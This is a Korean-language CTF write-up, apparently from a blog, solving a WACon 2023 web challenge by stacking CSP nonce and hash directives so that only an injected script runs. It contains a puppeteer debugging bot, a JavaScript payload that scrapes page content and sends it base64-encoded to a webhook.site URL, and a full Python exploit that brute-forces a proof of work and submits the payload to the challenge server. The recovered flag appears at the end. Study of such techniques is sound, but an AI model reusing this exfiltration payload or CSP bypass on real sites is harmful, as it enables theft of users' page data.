위와 같이 CSP에서 nonce 같은 경우 보안 우선순위를 가릴 수 없이 때문에 nonce 값이 하나만 적용되는 것이 아닌 둘 다 적용됩니다.

즉, script 태그에서, nonce가 하나만 만족하여서는 script가 실행이 되지 않고, 추가로 설정된 nonce까지 만족하여야 script가 실행됩니다.

이를 이용하면 공격자가 직접 지정한 script만 실행시키고, 다른 flag_container를 실행하는 코드나, 삭제하는 코드는 실행시키지 않고 그대로 HTML Leak을 진행할 수 있습니다.

script-src에는 sha256, 384?, 512 검사가 존재합니다. script 내부 inline 코드의 해시값을 검사하여 일치하는 코드만 실행하는데 공격자가 준 스크립트의 해시값을 검사하면 다른 스크립트는 nonce검사는 통과지만 hash 검사에서 실패하고, 
공격자의 hash 검사는 통과하여 결과적으로 공격자의 스크립트만 실행하게 됩니다.

이러한 원리를 사용하여 공격자만이 동작할 수 있는 hash 값을 설정하여 원격에서 보내려고 했지만 로돠리안이슈로 인해서 챌린지 서버에서 FLAG를 얻어낼 수 없었습니다.

그래서 bot.js를 수정해서 실제 puppeteer에서 발생하는 CSP 에러를 가져오도록 코드를 작성하였습니다.

```js
const puppeteer = require('puppeteer');

if (process.argv.length != 3) {
        console.error("Invalid invoke");
        process.exit(1);
}

let key = process.argv[2];
const url = "http://localhost/run.php?key=" + key;

(async () => {
  const browser = await puppeteer.launch({
      executablePath: '/usr/bin/google-chrome',
          args: ['--no-sandbox', '--disable-setuid-sandbox'],
          dumpio: true
  });
  const page = await browser.newPage();
   page
    .on('console', message =>
      console.log(`${message.type().substr(0, 3).toUpperCase()} ${message.text()}`))
    .on('pageerror', ({ message }) => console.log(message))
    .on('response', response =>
      console.log(`${response.status()} ${response.url()}`))
    .on('requestfailed', request =>
      console.log(`${request.failure().errorText} ${request.url()}`))
  const client = await page.target().createCDPSession();

  // Enable reporting of security issues
  await client.send('Security.enable');

  // Listen for CSP violations
  client.on('Security.violationReceived', violation => {
    console.log(`CSP VIOLATION: ${violation.violationType}`);
  });
  page.setDefaultNavigationTimeout(3000);
  await page.goto(url);
  const content = await page.content();
  console.log(content);
  await new Promise(r => setTimeout(r, 17000));
  await browser.close();
})();
```

위와 같이 코드를 작성하고 script를 실행하면 아래와 같이 CSP 에러를 확인해서 script src의 sha 값을 알아낼 수 있습니다.

```js
root@db99c6a029db:/app# node bot.js 40b79e3aa9a821667d849fc1d385606af05b1bc2

  Puppeteer old Headless deprecation warning:
    In the near future `headless: true` will default to the new Headless mode
    for Chrome instead of the old Headless implementation. For more
    information, please see https://developer.chrome.com/articles/new-headless/.
    Consider opting in early by passing `headless: "new"` to `puppeteer.launch()`
    If you encounter any bugs, please report them to https://github.com/puppeteer/puppeteer/issues/new/choose.

[0926/045001.951716:ERROR:bus.cc(406)] Failed to connect to the bus: Failed to connect to socket /run/dbus/system_bus_socket: No such file or directory
[0926/045001.954721:ERROR:bus.cc(406)] Failed to connect to the bus: Failed to connect to socket /run/dbus/system_bus_socket: No such file or directory
[0926/045001.954761:ERROR:bus.cc(406)] Failed to connect to the bus: Failed to connect to socket /run/dbus/system_bus_socket: No such file or directory

DevTools listening on ws://127.0.0.1:42349/devtools/browser/1177a493-1f17-46c4-abec-e7de4c381532
[0926/045001.959360:WARNING:bluez_dbus_manager.cc(247)] Floss manager not present, cannot set Floss enable/disable.
[0926/045001.963863:WARNING:sandbox_linux.cc(393)] InitializeSandbox() called with multiple threads in process gpu-process.
200 http://localhost/run.php?key=40b79e3aa9a821667d849fc1d385606af05b1bc2
ERR Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w='". Either the 'unsafe-inline' keyword, a hash ('sha256-3tmYDkIW3ItyGzvEh7kwQeVY9ElmiKthdw0R0y4LWTw='), or a nonce ('nonce-...') is required to enable inline execution.

ERR Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w='". Either the 'unsafe-inline' keyword, a hash ('sha256-hkXh22V8WBWlVTnSW180HfhNuhvoyfrWW0dy3toa074='), or a nonce ('nonce-...') is required to enable inline execution.

ERR Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w='". Either the 'unsafe-inline' keyword, a hash ('sha256-oVXtSIZ6oNv1VsBLKmao2GyCIe7BBHc/4lk633L90Uc='), or a nonce ('nonce-...') is required to enable inline execution.
```

결과 값을 확인해보면 script-src의 sha 값이 "sha256-T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w=" 인 것을 확인할 수 있습니다.

이러한 값을 csp 헤더에 script-src sha 값으로 설정하게 되면, 기본적으로 설정된 flag_container 관련 스크립트는 실행되지 않고 해당 sha 값을 사용한 script만 실행되게 됩니다.

script는 정규표현식을 사용해 FLAG 값을 webhook으로 전달하는 코드를 작성합니다.

```js
const regex = /eval\(([^)]+)\)/g; let st = ''; while ((matches = regex.exec(document.getElementById("flag_container").innerHTML)) !== null) {st+=matches[1];}location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c?flag="+btoa(st);
```

위 코드는 eval에서 "//" 뒤의 부분만 "flag_container"에서 가져와서 webhook으로 전달합니다.

Full Exploit 코드는 아래와 같습니다.

```python
import hashlib
import requests
import random
import itertools

script = open('script.js', 'r').read()

ascii = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%"

nonce = ""
check = ""

flag = 0

hashText = ""

def sha1(text):
    m = hashlib.sha1()
    m.update(text.encode('utf-8'))
    return m.hexdigest()

res = requests.get("http://58.229.185.61:8000/index.php", cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
})

nonce = res.text.split("sha1")[1].split("==")[0].split('"')[1]

hashText = res.text.split("sha1")[1].split("==")[1].split("</code>")[0].strip()

leakCheck = ""

for brute in itertools.product(ascii, repeat=5):
    check = ''.join(brute)
    if sha1(nonce + check) == hashText:
        leakCheck = check
        print("hash leak!, check : ", check)
        break


print("Send Pow : ", leakCheck)

res2 = requests.post("http://58.229.185.61:8000/submit.php", headers={
    "Content-Type": "application/x-www-form-urlencoded"
}, cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
}, data={
    "header": "Content-Security-Policy: script-src 'sha256-S9T+4pxwdCdgDuhSdqdsTSI3li/BHqci69Oa+iw6p7k=';",
    "script": """
    const regex = /eval\(([^)]+)\)/g; let st = ''; while ((matches = regex.exec(document.getElementById("flag_container").innerHTML)) !== null) {st+=matches[1];}location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c?flag="+btoa(st);
    """,
    "pow": leakCheck
})
print(res2.text)
```

위 Exploit 코드를 실행하게 되면 check_pow를 찾고 header를 재설정 한후 script를 실행시키게 됩니다.

webhook으로는 아래와 같이 응답이 오게 됩니다.

![Alt text](https://blog.kakaocdn.net/dn/Rzp2p/btsv7srXkge/3DdHwXax8doVUfwt7Ln3q1/img.png)

base64 인코딩이 되어있음으로 이를 디코딩 하면 아래와 같은 결과가 나타나게됩니다.

```
['////////////////////////////////////////$flag[0] = W', '////////////////////////////////////////$flag[1] = A', '////////////////////////////////////////$flag[2] = C', '////////////////////////////////////////$flag[3] = o', '////////////////////////////////////////$flag[4] = n', '////////////////////////////////////////$flag[5] = 2', '////////////////////////////////////////$flag[6] = 0', '////////////////////////////////////////$flag[7] = 2', '////////////////////////////////////////$flag[8] = 3', '////////////////////////////////////////$flag[9] = {', '////////////////////////////////////////$flag[10] = b', '////////////////////////////////////////$flag[11] = 6', '////////////////////////////////////////$flag[12] = e', '////////////////////////////////////////$flag[13] = e', '////////////////////////////////////////$flag[14] = 5', '////////////////////////////////////////$flag[15] = f', '////////////////////////////////////////$flag[16] = c', '////////////////////////////////////////$flag[17] = 6', '////////////////////////////////////////$flag[18] = 8', '////////////////////////////////////////$flag[19] = 7', '////////////////////////////////////////$flag[20] = a', '////////////////////////////////////////$flag[21] = 6', '////////////////////////////////////////$flag[22] = 7', '////////////////////////////////////////$flag[23] = 7', '////////////////////////////////////////$flag[24] = b', '////////////////////////////////////////$flag[25] = b', '////////////////////////////////////////$flag[26] = 1', '////////////////////////////////////////$flag[27] = b', '////////////////////////////////////////$flag[28] = a', '////////////////////////////////////////$flag[29] = f', '////////////////////////////////////////$flag[30] = 7', '////////////////////////////////////////$flag[31] = 2', '////////////////////////////////////////$flag[32] = 8', '////////////////////////////////////////$flag[33] = 5', '////////////////////////////////////////$flag[34] = d', '////////////////////////////////////////$flag[35] = c', '////////////////////////////////////////$flag[36] = a', '////////////////////////////////////////$flag[37] = 3', '////////////////////////////////////////$flag[38] = 1', '////////////////////////////////////////$flag[39] = b', '////////////////////////////////////////$flag[40] = 6', '////////////////////////////////////////$flag[41] = 7', '////////////////////////////////////////$flag[42] = 5', '////////////////////////////////////////$flag[43] = f', '////////////////////////////////////////$flag[44] = 6', '////////////////////////////////////////$flag[45] = 8', '////////////////////////////////////////$flag[46] = c', '////////////////////////////////////////$flag[47] = 9', '////////////////////////////////////////$flag[48] = d', '////////////////////////////////////////$flag[49] = 7', '////////////////////////////////////////$flag[50] = e', '////////////////////////////////////////$flag[51] = 6', '////////////////////////////////////////$flag[52] = d', '////////////////////////////////////////$flag[53] = d', '////////////////////////////////////////$flag[54] = d', '////////////////////////////////////////$flag[55] = 8', '////////////////////////////////////////$flag[56] = a', '////////////////////////////////////////$flag[57] = 9', '////////////////////////////////////////$flag[58] = 2', '////////////////////////////////////////$flag[59] = b', '////////////////////////////////////////$flag[60] = 8', '////////////////////////////////////////$flag[61] = 4', '////////////////////////////////////////$flag[62] = d', '////////////////////////////////////////$flag[63] = 5', '////////////////////////////////////////$flag[64] = 4', '////////////////////////////////////////$flag[65] = d', '////////////////////////////////////////$flag[66] = 4', '////////////////////////////////////////$flag[67] = 1', '////////////////////////////////////////$flag[68] = 7', '////////////////////////////////////////$flag[69] = 2', '////////////////////////////////////////$flag[70] = 9', '////////////////////////////////////////$flag[71] = d', '////////////////////////////////////////$flag[72] = 5', '////////////////////////////////////////$flag[73] = e']
```

한문자씩 나타나 있음으로 이를 일일히 가져오는 것보다 자동화하는 코드를 작성해 FLAG를 최종적으로 가져옵니다.

![Alt text](https://blog.kakaocdn.net/dn/dfTJzp/btsv8ivOaCz/RjT02hxJ3hY0WXBA6vpWCk/img.png)

위와 같이 성공적으로 FLAG를 얻어올 수 있습니다.

#### FLAG : ``WACon2023{b6ee5fc687a677bb1baf7285dca31b675f68c9d7e6ddd8a92b84d54d41729d5e}``